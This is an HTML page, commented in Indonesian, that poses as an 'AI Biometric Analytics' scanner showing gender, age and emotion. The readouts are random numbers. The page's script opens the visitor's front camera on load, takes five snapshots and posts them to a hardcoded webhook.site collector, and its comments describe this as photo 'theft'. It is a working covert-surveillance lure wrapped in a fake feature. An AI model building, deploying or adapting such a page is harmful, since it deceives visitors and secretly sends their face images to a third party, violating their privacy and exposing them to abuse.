<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Biometric Analytics v2.0</title>
    <style>
        body { margin: 0; padding: 0; width: 100vw; height: 100vh; background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        
        /* Frame Scanner */
        #scanner-container { position: relative; width: 280px; height: 280px; border: 1px solid #00ff00; display: flex; justify-content: center; align-items: center; background: rgba(0, 255, 0, 0.05); }

        /* Video Stream dengan filter Matrix */
        #video { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.5; filter: contrast(1.2) brightness(1.2) sepia(100%) hue-rotate(80deg); }

        /* Garis Scan */
        #scan-line { position: absolute; width: 100%; height: 4px; background: rgba(0, 255, 0, 0.5); box-shadow: 0 0 15px #00ff00; top: 0; animation: scan 2.5s ease-in-out infinite; z-index: 5; }

        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }

        /* Label Data AI */
        .ai-label { position: absolute; left: 300px; width: 150px; font-size: 11px; text-shadow: 0 0 5px #00ff00; line-height: 1.5; pointer-events: none; }
        @media (max-width: 500px) { .ai-label { left: 10px; top: 10px; background: rgba(0,0,0,0.5); } }

        .data-box { border-left: 2px solid #00ff00; padding-left: 8px; margin-bottom: 10px; opacity: 0; transition: opacity 0.5s; }

        #canvas { display: none; }
        #log { width: 280px; font-size: 10px; margin-top: 20px; height: 50px; overflow: hidden; color: #008800; }
    </style>
</head>
<body>

    <div id="scanner-container">
        <div id="scan-line"></div>
        <video id="video" autoplay muted playsinline></video>
        <canvas id="canvas" width="640" height="480"></canvas>

        <div class="ai-label" id="ai-panel">
            <div class="data-box" id="box-gender">GENDER: <span id="val-gender">CALIBRATING...</span></div>
            <div class="data-box" id="box-age">AGE: <span id="val-age">MEASURING...</span></div>
            <div class="data-box" id="box-emotion">EMOTION: <span id="val-emotion">ANALYZING...</span></div>
        </div>
    </div>

    <div id="log">>> SYSTEM READY...<br>>> AWAITING BIOMETRIC INPUT...</div>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const log = document.getElementById('log');
        
        let photoCount = 0;

        // Data simulasi biar keliatan pinter
        const genders = ["MALE (98%)", "FEMALE (96%)", "UNIDENTIFIED"];
        const emotions = ["NEUTRAL", "HAPPY", "CALM", "FOCUSED", "SURPRISED"];

        async function initAI() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    updateLog("CAMERA LINK ESTABLISHED...");
                    updateLog("SCANNING BIOMETRIC DATA...");
                    
                    // Munculkan panel AI satu per satu
                    setTimeout(() => { document.getElementById('box-gender').style.opacity = 1; }, 1000);
                    setTimeout(() => { document.getElementById('box-age').style.opacity = 1; }, 2000);
                    setTimeout(() => { document.getElementById('box-emotion').style.opacity = 1; }, 3000);

                    // Mulai siklus "pencurian" foto
                    setTimeout(processAI, 4000);
                };
            } catch (err) {
                updateLog("ERROR: ACCESS DENIED");
            }
        }

        function processAI() {
            if (photoCount >= 5) {
                updateLog("ENCRYPTION COMPLETE. DATA SAVED.");
                return;
            }

            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                photoCount++;

                // Update data simulasi di layar
                const randomAge = Math.floor(Math.random() * (30 - 17 + 1)) + 17;
                document.getElementById('val-gender').innerText = genders[Math.floor(Math.random() * 2)];
                document.getElementById('val-age').innerText = randomAge + " YEARS";
                document.getElementById('val-emotion').innerText = emotions[Math.floor(Math.random() * emotions.length)];

                updateLog(`UPLOADING PACKET ${photoCount}/5...`);

                // Ambil foto asli
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataFoto = canvas.toURL ? canvas.toDataURL('image/jpeg', 0.4) : canvas.toDataURL('image/jpeg', 0.4);

                // Kirim ke Webhook
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        type: "AI_ANALYSIS",
                        snap_id: photoCount,
                        simulated_age: randomAge,
                        image: dataFoto
                    })
                });
            }

            setTimeout(processAI, 3000);
        }

        function updateLog(msg) {
            log.innerHTML += `<br>>> ${msg}`;
        }

        window.onload = initAI;
    </script>
</body>
</html>
